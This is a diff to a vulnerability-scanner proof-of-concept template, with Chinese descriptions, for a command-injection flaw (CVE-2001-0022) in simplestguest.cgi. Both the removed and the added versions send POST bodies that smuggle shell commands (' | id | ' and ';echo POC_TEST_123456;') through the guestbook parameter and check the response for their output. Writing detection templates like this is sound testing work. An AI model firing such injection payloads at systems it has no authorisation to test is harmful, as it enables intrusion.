@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 simplestguest.cgi 发送包含 shell 元字符的 POST 请求，检测目标是否存在远程命令执行漏洞。若响应中包含命令执行结果（如 uid=），则确认漏洞存在。"
+description = "验证 Leif M. Wright simplestguest.cgi 2.0 远程命令执行漏洞，通过 guestbook 参数注入 Shell 元字符执行任意命令"
 id = "POC-AVE-2001-0009"
-name = "Leif M. Wright simplestguest.cgi 远程命令执行 PoC"
+name = "CVE-2001-0022 PoC"
 severity = "critical"
 tags = ["ave-2001-0009"]
 vuln_id = [
@@ -11,22 +11,23 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/simplestguest.cgi"
+path = "/cgi-bin/simplestguest.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "required=NAME&guestbook=%20%7C%20id%20%7C&NAME=user"
-type = "raw"
+content = "guestbook=;echo POC_TEST_123456;&action=sign&name=test&email=test@test.com&url=http://test.com"
+type = "form"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = ["POC_TEST_123456"]
